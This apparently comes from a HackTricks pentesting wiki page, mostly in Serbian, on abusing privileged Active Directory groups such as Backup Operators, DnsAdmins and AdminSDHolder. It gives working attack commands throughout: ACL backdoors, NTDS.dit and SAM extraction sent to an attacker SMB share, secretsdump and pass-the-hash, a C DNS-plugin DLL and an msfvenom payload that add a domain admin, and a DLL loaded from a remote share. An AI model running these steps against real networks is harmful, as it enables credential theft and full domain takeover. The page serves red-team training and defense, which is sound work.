# Privilegovane grupe

{{#include ../../banners/hacktricks-training.md}}

## Dobro poznate grupe sa administrativnim privilegijama

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ova grupa ima ovlašćenje da kreira naloge i grupe koje nisu administratori na domenu. Pored toga, omogućava lokalnu prijavu na Domain Controller (DC).

Da biste identifikovali članove ove grupe, izvršava se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC.

## AdminSDHolder grupa

Lista kontrole pristupa (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" u Active Directory, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava sigurnost ovih grupa sprečavajući neovlašćene izmene.

Napadač bi mogao iskoristiti ovo tako što bi izmenio ACL grupe **AdminSDHolder**, dodeljujući pune dozvole običnom korisniku. To bi tom korisniku efektivno dalo potpunu kontrolu nad svim zaštićenim grupama. Ako su dozvole tog korisnika izmenjene ili uklonjene, biće automatski vraćene u roku od sat vremena zbog dizajna sistema.

Komande za pregled članova i izmenu dozvola uključuju:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Skripta je dostupna za ubrzanje procesa obnove: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje obrisanih Active Directory objekata, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Pristup Domain Controlleru

Pristup fajlovima na DC-u je ograničen osim ako korisnik nije član grupe `Server Operators`, koja menja nivo pristupa.

### Eskalacija privilegija

Korišćenjem `PsService` ili `sc` iz Sysinternals, moguće je pregledati i izmeniti dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda pokazuje da `Server Operators` imaju potpuni pristup, što omogućava manipulaciju servisima za eskalaciju privilegija.

## Backup Operators

Članstvo u grupi `Backup Operators` omogućava pristup fajl sistemu `DC01` zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju prelaženje kroz direktorijume, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći flag `FILE_FLAG_BACKUP_SEMANTICS`. Za ovaj proces je neophodno koristiti specifične skripte.

Da biste izlistali članove grupe, izvršite:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni napad

Da biste lokalno iskoristili ove privilegije, primenjuju se sledeći koraci:

1. Uvezi potrebne biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogućite i proverite `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristupite i kopirajte datoteke iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD napad

Direktan pristup fajl sistemu Domain Controller-a omogućava krađu baze podataka `NTDS.dit`, koja sadrži sve `NTLM` hešove za korisnike i računare domena.

#### Korišćenje diskshadow.exe

1. Napravite shadow copy diska `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` iz shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje datoteka:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Izvuci `SYSTEM` i `SAM` za dobijanje hashova:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmite sve hashes iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nakon ekstrakcije: Pass-the-Hash ka DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Korišćenje wbadmin.exe

1. Podesite NTFS fajl-sistem za SMB server na napadačevoj mašini i keširajte SMB kredencijale na ciljnoj mašini.
2. Koristite `wbadmin.exe` za backup sistema i ekstrakciju `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

Da biste prikazali članove grupe DnsAdmins, koristite:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Izvršavanje proizvoljnog DLL-a (CVE‑2021‑40469)

> [!NOTE]
> Ova ranjivost omogućava izvršavanje proizvoljnog koda sa SYSTEM privilegijama u DNS servisu (obično unutar DCs). Ovaj problem je ispravljen 2021. godine.

Članovi mogu naterati DNS server da učita proizvoljni DLL (ili lokalno ili sa remote share-a) koristeći komande kao što su:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS servisa (što može zahtevati dodatne dozvole) neophodno je da bi se DLL učitao:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Za više detalja o ovom vektoru napada, pogledajte ired.team.

#### Mimilib.dll

Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, modifikujući ga da pokreće specifične komande ili reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.

### WPAD zapis za MitM

DnsAdmins mogu manipulisati DNS zapisima da izvrše Man-in-the-Middle (MitM) napade kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranih upita. Alati kao što su Responder ili Inveigh mogu se koristiti za spoofing i presretanje mrežnog saobraćaja.

### Event Log Readers
Members mogu pristupiti zapisima događaja, potencijalno pronalazeći osetljive informacije kao što su plaintext lozinke ili detalji izvršavanja komandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ova grupa može menjati DACLs na domain object, potencijalno dodeljujući DCSync privilegije. Tehnike za privilege escalation koje iskorišćavaju ovu grupu detaljno su opisane u Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators imaju potpuni pristup Hyper-V-u, što se može iskoristiti za preuzimanje kontrole nad virtualizovanim Domain Controllers. To uključuje kloniranje živih DC-ova i izdvajanje NTLM hash-ova iz fajla NTDS.dit.

### Primer iskorišćavanja

Mozilla Maintenance Service iz Firefoxa može biti iskorišćena od strane Hyper-V Administrators da izvršava komande kao SYSTEM. Ovo podrazumeva kreiranje hard linka ka zaštićenom SYSTEM fajlu i njegovo zamenjivanje malicioznim izvršnim fajlom:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Napomena: Hard link exploitation je mitigiran u nedavnim Windows update-ima.

## Group Policy Creators Owners

Ova grupa omogućava članovima da kreiraju Group Policies u domenu. Međutim, njeni članovi ne mogu primeniti group policies na korisnike ili grupe niti uređivati postojeće GPO-e.

## Organization Management

U okruženjima gde je Microsoft Exchange postavljen, posebna grupa poznata kao Organization Management ima značajne mogućnosti. Ova grupa ima privilegiju da pristupi poštanskim sandučićima svih korisnika domena i održava potpunu kontrolu nad 'Microsoft Exchange Security Groups' Organizational Unit (OU). Ta kontrola uključuje `Exchange Windows Permissions` grupu, koju je moguće iskoristiti za privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Članovi Print Operators grupe imaju nekoliko privilegija, uključujući `SeLoadDriverPrivilege`, koja im omogućava da se lokalno prijave na Domain Controller, isključe ga i upravljaju štampačima. Da bi se iskoristile ove privilegije — posebno ako `SeLoadDriverPrivilege` nije vidljiva u kontekstu bez povišenih privilegija — neophodno je zaobići User Account Control (UAC).

Da bi se izlistali članovi ove grupe, koristi se sledeća PowerShell komanda:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Za detaljnije tehnike iskorišćavanja vezane za **`SeLoadDriverPrivilege`**, konsultujte odgovarajuće sigurnosne resurse.

#### Remote Desktop korisnici

Članovima ove grupe je dodeljen pristup računarima preko Remote Desktop Protocol (RDP). Za enumeraciju ovih članova dostupne su PowerShell komande:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalji uvidi u iskorišćavanje RDP-a mogu se naći u posvećenim pentesting resursima.

#### Korisnici daljinskog upravljanja

Članovi mogu pristupiti računarima preko **Windows Remote Management (WinRM)**. Enumeracija ovih članova postiže se putem:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Za tehnike eksploatacije vezane za **WinRM**, treba konsultovati specifičnu dokumentaciju.

#### Server Operators

Ova grupa ima dozvole za izvršavanje raznih konfiguracija na Domain Controllers, uključujući privilegije za backup i restore, promenu sistemskog vremena i gašenje sistema. Za izlistavanje članova koristi se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Izvori <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
